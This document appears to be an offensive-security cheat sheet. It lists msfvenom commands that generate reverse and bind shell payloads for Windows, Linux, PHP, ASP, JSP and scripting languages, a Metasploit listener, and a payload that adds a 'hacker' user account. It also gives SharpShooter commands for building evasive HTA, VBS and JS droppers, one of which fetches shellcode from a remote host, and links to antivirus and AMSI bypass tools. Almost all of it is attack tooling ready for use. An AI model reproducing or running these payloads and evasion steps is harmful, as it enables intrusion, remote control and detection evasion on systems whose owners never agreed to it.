# Payloads

## msfvenom

```text
# Creating a payload
msfvenom -p [payload] LHOST=[listeninghost] LPORT=[listeningport]

# List of payloads
msfvenom -l payloads

# Payload options
msfvenom -p windows/x64/meterpreter_reverse_tcp --list-options

# Creating a payload with encoding
msfvenom -p [payload] -e [encoder] -f [formattype] -i [iteration]  > outputfile

# Creating a payload using a template
msfvenom -p [payload]  -x [template] -f [formattype] > outputfile

# Listener for MSfvenom Payloads:
msf5>use exploit/multi/handler  
msf5>set payload windows/meterpreter/reverse_tcp  
msf5>set lhost   
msf5>set lport   
msf5> set ExitOnSession false  
msf5>exploit -j  

#  Windows Payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe    
msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe    
msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe    
msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe    
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe

#  Linux Payloads
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf    
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf    
msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf    
msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf

# Add a user in windows with msfvenom: 
msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe

#  Web Payloads

# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw > shell.php
cat shell.php | pbcopy && echo ' shell.php && pbpaste >> shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war

#  Scripting Payloads

# Python
msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > shell.py

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > shell.sh

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl

# Creating an Msfvenom Payload with an encoder while removing bad charecters:
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x0A\x0D"

https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/
```

## Bypass AV

```text
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless: 
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload: 
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut: 
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

## Bypass Amsi

```text
# Testing for Amsi Bypass:
https://github.com/rasta-mouse/AmsiScanBufferBypass

# Amsi-Bypass-Powershell
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

https://blog.f-secure.com/hunting-for-amsi-bypasses/
https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
https://github.com/cobbr/PSAmsi/wiki/Conducting-AMSI-Scans
https://slaeryan.github.io/posts/falcon-zero-alpha.html
```

## Office Docs

```text
https://github.com/thelinuxchoice/eviloffice
https://github.com/thelinuxchoice/evilpdf
```